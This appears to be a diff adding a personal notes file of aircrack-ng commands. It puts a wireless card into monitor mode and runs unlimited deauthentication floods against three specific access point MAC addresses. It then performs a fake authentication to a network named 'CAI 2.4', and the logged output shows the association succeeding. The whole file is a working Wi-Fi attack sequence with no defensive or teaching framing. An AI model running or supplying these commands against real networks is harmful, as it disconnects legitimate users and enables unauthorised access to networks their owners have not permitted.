@@ -1,0 +1,31 @@
+sudo su -
+airmon-ng start wlan0
+airodump-ng mon0
+iwconfig wlan0 channel "9"
+iwconfig mon0 channel "9"
+aireplay-ng --deauth 0 -a "00:23:69:66:C5:2E" mon0
+
+
+
+iwconfig wlan0 channel 1
+iwconfig mon0 channel 1
+aireplay-ng --deauth 0 -a 00:21:1C:79:1A:40 mon0 --ignore-negative-one
+
+
+iwconfig wlan0mon channel 1
+aireplay-ng --deauth 0 -a F0:B0:52:39:98:98 wlan0mon --ignore-negative-one
+
+
+
+
+aireplay-ng --fakeauth 0 -e "CAI 2.4" -a 00:23:69:66:C5:2E mon0
+
+
+
+No source MAC (-h) specified. Using the device MAC (00:0F:B5:FD:FD:47)
+07:27:14  Waiting for beacon frame (BSSID: 00:23:69:66:C5:2E) on channel 9
+
+07:27:14  Sending Authentication Request (Open System) [ACK]
+07:27:14  Authentication successful
+07:27:14  Sending Association Request [ACK]
+07:27:14  Association successful :-) (AID: 1)
